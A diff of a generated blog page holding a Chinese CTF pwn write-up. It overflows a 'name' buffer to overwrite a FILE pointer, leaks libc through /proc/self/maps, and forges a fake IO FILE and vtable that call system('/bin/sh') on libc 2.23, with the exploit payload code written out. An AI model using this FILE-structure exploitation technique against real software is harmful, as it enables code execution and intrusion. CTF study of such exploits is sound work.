@@ -75,7 +75,7 @@
         		<a class="sb-toggle-submenu">Categories<span class="sb-caret"></span></a>
             	<ul class="sb-submenu">
 				  	
-				    <li><a href="/categories/AUDITION/" class="animsition-link">AUDITION<small>(23)</small></a></li>
+				    <li><a href="/categories/AUDITION/" class="animsition-link">AUDITION<small>(22)</small></a></li>
 				    
 				    <li><a href="/categories/CSAPP-LAB/" class="animsition-link">CSAPP LAB<small>(1)</small></a></li>
 				    
@@ -263,13 +263,11 @@
         </div>
         <div class="col-md-8 col-md-offset-2">
       		
-    <div id="aplayer-bUnFydyq" class="aplayer aplayer-tag-marker meting-tag-marker" data-id="7342554262" data-server="netease" data-type="playlist" data-mode="circulation" data-autoplay="false" data-mutex="true" data-listmaxheight="340px" data-preload="auto" data-theme="#555"></div>
-
+    <div id="aplayer-TPSnwJaI" class="aplayer aplayer-tag-marker meting-tag-marker" data-id="7342554262" data-server="netease" data-type="playlist" data-mode="circulation" data-autoplay="false" data-mutex="true" data-listmaxheight="340px" data-preload="auto" data-theme="#555"></div>
 <h1><span id="overview">overview</span></h1><p><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-05-07%20%E4%B8%8B%E5%8D%883.50.04.png" alt="截屏2022-05-07 下午3.50.04"></p>
 <h1><span id="reverse">reverse</span></h1><h2><span id="open">open</span></h2><p>​        打开一个文件，但是文件名不能包含flag.顺便在<code>0x804B0C0</code>上初始化了一块magic buf，此外，一次只能打开一个文件。</p>
 <h2><span id="read">read</span></h2><p>​        读取文件到magic buf。</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">result = fread(magicbuf, 0x18Fu, 1u, fp);</span><br></pre></td></tr></table></figure>
-
 <h2><span id="write">write</span></h2><p>​        对flag的一些字符串进行过滤，然后put magic buf。</p>
 <h2><span id="close">close</span></h2><p>​        就是关闭</p>
 <h2><span id="name">name</span></h2><p>​        留下name，name作为全局变量储存在magic buf相邻的地方。name的大小事32，但是没有作限制，可以溢出覆盖*fp。</p>
@@ -280,16 +278,10 @@
 <p>​        所以我们只能伪造文件描述符，也就是利用到IOFILE的知识伪造iofile，然后将文件描述符指针覆盖为vtable指针，再利用相关知识getshell。由于题目的libc是2.23，所以我们只需要伪造vtable，而不用管一些检测。</p>
 <h2><span id="利用过程">利用过程</span></h2><h3><span id="直接读取proc获取libc">直接读取proc获取libc</span></h3><p>就是<code>open(&quot;/proc/self/maps&quot;)</code></p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">open</span>(<span class="string">&#x27;/proc/self/maps&#x27;</span>)</span><br><span class="line">read()</span><br><span class="line">write()</span><br><span class="line">p.recvuntil(<span class="string">&quot;[heap]&quot;</span>)</span><br><span class="line">libc_base = u32(p.recv(<span class="number">8</span>))</span><br><span class="line">log.success(<span class="string">&quot;libc_base =&gt; &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(libc_base)))</span><br></pre></td></tr></table></figure>
-
 <h3><span id="伪造file">伪造file</span></h3><p>​        关于细节，32位程序需要伪造一个假的file，并且让fp指针指向它。参考的文章是<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/a6354fa4dbdf">https://www.jianshu.com/p/a6354fa4dbdf</a></p>
 <p>​        首先利用0x20个字节填充name和fp指针之间的空隙。然后覆盖fp为fake vtable。</p>
 <p>​        </p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span> <span class="comment">#pad to 0x804b280.point to fp</span></span><br><span class="line">payload += p32(buf_addr) <span class="comment">#0x804b284 -&gt; 0x804b284 </span></span><br><span class="line">fake_file = <span class="string">&quot;/bin/sh\x00&quot;</span><span class="comment">#0x288</span></span><br><span class="line">fake_file = fake_file.ljust(<span class="number">0x48</span>,<span class="string">&#x27;\x00&#x27;</span>) <span class="comment"># 0x288 + 0x48 = 0x2d0</span></span><br><span class="line">fake_file += p32(fake_lock_addr) <span class="comment"># 指向一处值为0的地址,0x2d8</span></span><br><span class="line">fake_file = fake_file.ljust(<span class="number">0x94</span>, <span class="string">&quot;\x00&quot;</span>) <span class="comment">#0x368</span></span><br><span class="line">fake_vtable = p32(<span class="number">0x804B358</span>) <span class="comment"># fake vtable address = buf_addr + 0x98 - 0x44 (addr - 0x44 + 0x98) </span></span><br><span class="line">fake_file += p32(fake_vtable)<span class="comment">#0x36c</span></span><br><span class="line">fake_file += p32(system)</span><br><span class="line">payload += fake_file</span><br></pre></td></tr></table></figure>
-
-
-
-
-
 <p>​</p>
 
             <div class="clearfix"></div>
